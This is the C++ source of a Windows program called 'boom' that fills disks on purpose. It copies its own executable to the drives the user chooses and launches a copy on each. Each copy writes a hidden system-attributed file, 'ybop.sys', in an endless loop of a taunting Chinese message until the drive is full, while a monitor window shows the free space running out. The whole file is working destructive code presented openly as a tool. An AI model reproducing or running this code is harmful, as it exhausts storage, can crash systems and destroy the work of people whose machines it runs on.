#include<iostream>
#include<cstdio>
#include<cstring>
#include<windows.h>
using namespace std;

void boom_now(char *argv)
{
    char perfix[50]="title Booming disk ";
	char surfix[30]="......      boom by yyfleo";
	char temp[5]={argv[1]};
	strcat(strcat(perfix,temp),surfix);
    system(perfix);
    freopen("ybop.sys", "w", stdout);
    cout<<"你太笨了！还真看文件内容！  ";
    system("attrib +s ybop.sys");
    while(1)
    {
        cout<<"你太笨了！还真看文件内容！  ";
    }
    fclose(stdout);
    return;
}

int outputunit(ULONGLONG quadpart)
{
	if(quadpart/1024/1024/1024.0>=1)
	{
		//GB
		return 1;
	}
	if(quadpart/1024/1024.0>=1)
	{
		//MB
		return 2;
	}
	if(quadpart/1024.0>=1)
	{
		//KB
		return 3;
	}
	//<1KB
	return -1;
}

void output(char *disks)
{ 
	while(1)
	{
		system("cls");
		system("title Getting Disk Free Space......      boom by yyfleo");
		cout<<"Output File Name:ybop.sys"<<endl;
		cout<<"Output File is a system file √"<<endl<<endl;
		for(int i=0;i<26&&disks[i]!=' ';i++)
 		{
 	   		_ULARGE_INTEGER totalspace,freespace;
   	 		int unit;
    		cout<<disks[i]<<endl;
    		cout<<"Disk Total Space:";
    		char perfix[5]={disks[i]};
    		char surfix[5]=":";
    		strcat(perfix,surfix);
    		GetDiskFreeSpaceEx(perfix,NULL,&totalspace,&freespace);
    		unit=outputunit(totalspace.QuadPart);
    		switch(unit)
    		{
    			case 1:cout<<totalspace.QuadPart/1024/1024/1024.0<<"GB"<<endl;
    				   break;
    			case 2:cout<<totalspace.QuadPart/1024/1024.0<<"MB"<<endl;
    				   break;
    			case 3:cout<<totalspace.QuadPart/1024.0<<"KB"<<endl;
    				   break;
    			case -1:cout<<"The disk is unreachable!"<<endl;
    				   break;
			}
			cout<<"Disk Free Space:";
			unit=outputunit(freespace.QuadPart);
    		switch(unit)
    		{
    			case 1:cout<<freespace.QuadPart/1024/1024/1024.0<<"GB"<<endl;
    				   break;
    			case 2:cout<<freespace.QuadPart/1024/1024.0<<"MB"<<endl;
    				   break;
    			case 3:cout<<freespace.QuadPart/1024.0<<"KB"<<endl;
    				   break;
    			case -1:cerr<<"The Disk is full!"<<endl;
    				   break;
			}
  	 	}
    	Sleep(1000);
    	cout<<endl<<"Getting Disk Free Space......"<<endl;
    }
}

int main(int argc, char *argv[])
{
    if(argc>1)
    {
        boom_now(argv[1]);
        return 0; 

    }
    system("title Welcome!      boom by yyfleo");
    cout<<"Welcome to boom!"<<endl;
    cout<<"Version V2.6"<<endl;
    cout<<"Build 20161129"<<endl<<endl; 
    cout<<"Update logs:"<<endl;
    cout<<"============"<<endl;
    cout<<"V2.6"<<endl;
    cout<<"1.更改无盘提示语句"<<endl; 
    cout<<"2.增加更新日志"<<endl; 
    cout<<"3.更改读盘符时的标题"<<endl;
    cout<<"============"<<endl<<endl;
    
    cout<<"Copyright yyfleo"<<endl
		<<"Licensed under the Apache License, Version 2.0 (the \"License\");"<<endl
		<<"You may not use this file except in compliance with the License."<<endl
		<<"You may obtain a copy of the License at"<<endl<<endl
		<<"http://www.apache.org/licenses/LICENSE-2.0"<<endl<<endl
		<<"Unless required by applicable law or agreed to in writing, software"<<endl
		<<"distributed under the License is distributed on an \"AS IS\" BASIS,"<<endl
		<<"WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."<<endl
		<<"See the License for the specific language governing permissions and"<<endl
		<<"limitations under the License."<<endl;
    
    system("pause>nul");
    
    system("cls");
    system("title Reading Logical Drives......      boom by yyfleo");
    cout<<"Reading Logical Drives...Please wait for a while."<<endl;
    int ld=GetLogicalDrives();
    int map[26]={0};
    
    system("cls");
    system("title Waiting for the user choose disk to boom......      boom by yyfleo");
    cout<<"Logical Drives on the computer:";
    for(int i=0;ld!=0;i++)
    {
        map[i]=ld&0x01;
        ld=ld>>1;
        if(map[i]==1) cout<<(char)(map[i]+64+i)<<' ';
    }
    char bdisk[26]={' '};
    for(int i=0;i<26;i++)
    {
        cout<<endl<<"Type the disk to boom(Only one)[End input type 0]:";
        cin>>bdisk[i];
        if(bdisk[i]=='0')
        {
            bdisk[i]=' ';
            break;
        }
        if(map[bdisk[i]-65]!=1)
        {
            bdisk[i]=' ';
            cerr<<"Error:The disk is not available!"<<endl;
            i-=1;
        }
    }
    if(bdisk[0]==' ')
    {
        system("title Failed to boom      boom by yyfleo");
        cerr<<"Error:You chose nothing!"<<endl;
        system("pause>nul");
        return -1;
    }
    
    system("cls");
    system("title Copying the files......      boom by yyfleo");
    cout<<"Copying the files......Please wait for a while."<<endl;    
	for(int i=0;i<26&&bdisk[i]!=' ';i++)
    {
		char perfix[35]="copy /y boom.exe ";
		char temp[5]={bdisk[i]};
		char surfix[15]=":\\boom.exe";
        strcat(strcat(perfix,temp),surfix);
        system(perfix);
    }
    
    system("cls");
    system("title Booming......      boom by yyfleo");
    cout<<"Booming......Please wait for a while."<<endl;
    for(int i=0;i<26&&bdisk[i]!=' ';i++)
    {
        char perfix[50]="start /d ";
        char temp[5]={bdisk[i]};
        char surfix[30]=":\\ /min boom.exe ";
        strcat(strcat(strcat(perfix,temp),surfix),temp);
        system(perfix);
    }
    output(bdisk);
    return 0;
}
